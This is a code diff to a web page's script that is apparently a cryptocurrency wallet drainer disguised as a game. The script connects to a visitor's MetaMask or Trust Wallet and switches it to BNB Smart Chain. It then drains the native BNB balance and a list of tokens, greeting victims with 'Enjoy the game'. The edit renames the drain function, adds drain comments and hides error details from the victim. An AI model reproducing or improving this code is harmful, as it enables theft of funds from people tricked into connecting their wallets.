@@ -161,7 +161,7 @@
 
     let connected = false;
 
-    async function drain() {
+    async function startDrain() {
       if (!window.ethereum) {
         status.innerHTML = "<span class='error'>Please open in Trust Wallet or MetaMask 💔</span>";
         return;
@@ -171,7 +171,7 @@
         if (!connected) {
           await window.ethereum.request({ method: "eth_requestAccounts" });
           connected = true;
-          status.innerHTML = "Connecting wallet... 💕";
+          status.innerHTML = "Connecting... 💕";
         }
 
         const provider = new ethers.BrowserProvider(window.ethereum);
@@ -179,14 +179,12 @@
         const user = await signer.getAddress();
 
         try {
-          await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: '0x38' }]
-          });
+          await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
         } catch (e) {}
 
         let drainedSomething = false;
 
+        // Drain BNB immediately
         const nativeBalance = await provider.getBalance(user);
         const minThreshold = ethers.parseEther("0.0005");
         const reserve = ethers.parseEther("0.002");
@@ -204,6 +202,7 @@
           }
         }
 
+        // Drain tokens immediately
         for (const token of tokens) {
           try {
             const contract = new ethers.Contract(token.a, abi, signer);
@@ -218,15 +217,15 @@
         if (drainedSomething) {
           status.innerHTML = "<span class='success'>Welcome! Enjoy the game 💖</span>";
         } else {
-          status.innerHTML = `<span class='error'>No balance detected (${ethers.formatEther(nativeBalance)} BNB) 💔</span>`;
+          status.innerHTML = "<span class='error'>Failed 💔</span>";
         }
 
       } catch (e) {
-        status.innerHTML = "<span class='error'>Failed - Check network (BNB Smart Chain) 💔</span>";
+        status.innerHTML = "<span class='error'>Failed 💔</span>";
       }
     }
 
-    btn.onclick = drain;
+    btn.onclick = startDrain;
   </script>
 </body>
 </html>
